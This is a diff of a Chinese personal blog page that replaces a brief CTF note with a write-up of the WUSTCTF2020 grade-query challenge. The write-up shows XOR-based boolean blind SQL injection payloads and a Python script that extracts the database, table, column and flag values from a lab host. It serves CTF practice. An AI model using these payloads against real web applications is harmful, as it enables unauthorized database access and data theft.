@@ -5,7 +5,7 @@
     
 <meta charset="utf-8" >
 
-<title>[BJDCTF 2nd]假猪套天下第一 | ev11ccaatt</title>
+<title>[WUSTCTF2020]颜值成绩查询 | ev11ccaatt</title>
 <meta name="description" content="人菜多学">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -80,22 +80,55 @@
       <div class="content-container">
         <div class="post-detail">
           
-          <h2 class="post-title">[BJDCTF 2nd]假猪套天下第一</h2>
+          <h2 class="post-title">[WUSTCTF2020]颜值成绩查询</h2>
           <div class="post-info post-detail-info">
-            <span><i class="icon-calendar-outline"></i> 2021-03-30</span>
+            <span><i class="icon-calendar-outline"></i> 2021-04-17</span>
             
           </div>
           <div class="post-content">
-            <p>不是很想写，但还是做个记录，添加一系列的头。就能拿到一串base64。</p>
+            <p>进去后有个搜索框，测试一下，貌似是个注入，测试出来貌似可以用1<sup>x</sup>1来注入。</p>
+<p>那么先手动写个</p>
+<p>1<sup>(ascii(substr((select(database())),1,1))&gt;1)</sup>1</p>
+<p>1<sup>(ascii(substr((select(database())),1,1))&gt;200)</sup>1</p>
+<p>来测试一下是不是bool盲注</p>
+<p>分别是<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417181204279.png" alt="image-20210417181204279" loading="lazy">和<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417181215999.png" alt="image-20210417181215999" loading="lazy"></p>
+<p>那么就写脚本吧.</p>
+<pre><code class="language-python">import requests
+import time
+url = 'http://149d6f6a-c122-4975-8e5c-60192a85f15f.node3.buuoj.cn/'
+flag =&quot;&quot;
+for i in range(1,10000):
+    l = 32
+    r = 128
+    mid = (l+r)//2
+    while(l&lt;r):
+        #payload = &quot;?stunum=1^(ascii(substr((select(database())),{},1))&gt;{})^1&quot;.format(i,mid)
+        #payload = &quot;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))&gt;{})^1&quot;.format(i,mid)
+        #payload = &quot;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))&gt;{})^1&quot;.format(i,mid)
+        payload = &quot;?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))&gt;{})^1&quot;.format(i,mid)
+        time.sleep(0.4)
+        ba = requests.get(url+payload).text
+        if &quot;Hi admin, your score is: 100&quot; in ba:
+            l = mid + 1
+        else:
+            r = mid
+        mid = (l+r) // 2
+    if(mid==32 or mid ==132):
+        break
+    flag +=chr(mid)
+    print(flag)
+print(flag) 
+</code></pre>
+<p>大概就这样，</p>
 
           </div>
         </div>
 
         
           <div class="next-post">
-            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf-2ndold-hack/">
+            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bsidescf-2019kookie/">
               <h3 class="post-title">
-                下一篇：[BJDCTF 2nd]old-hack
+                下一篇：[BSidesCF 2019]Kookie
               </h3>
             </a>
           </div>
